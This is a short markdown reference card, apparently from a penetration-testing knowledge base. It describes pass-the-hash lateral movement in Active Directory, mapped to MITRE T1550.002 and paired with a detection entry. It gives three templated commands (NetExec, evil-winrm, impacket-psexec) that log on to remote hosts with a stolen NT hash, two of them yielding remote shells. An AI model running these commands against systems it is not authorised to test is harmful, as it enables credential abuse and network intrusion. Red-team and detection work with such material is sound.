---
id: pth-lateral-nxc
title: Pass-the-hash lateral movement (SMB / WinRM / psexec)
section: Active Directory — attack paths
phase: Lateral Movement
attack:
  tactic: TA0008
  techniques: [T1550.002]
platform: [windows, network]
source: hacktheplanet §"Active Directory — attack paths" (PtH / overpass-the-hash)
pair: lateral-4624-fanout
---

With an NT hash you never need the cleartext — authenticate straight to SMB,
WinRM, or a psexec shell. Reusing one hash across the subnet is the lateral
sweep; from the DC's view each landing is a fresh network logon.

```sh
nxc smb {{rhost}} -u {{user}} -H {{nthash}}
evil-winrm -i {{rhost}} -u {{user}} -H {{nthash}}
impacket-psexec {{domain}}/{{user}}@{{rhost}} -hashes :{{nthash}}
```
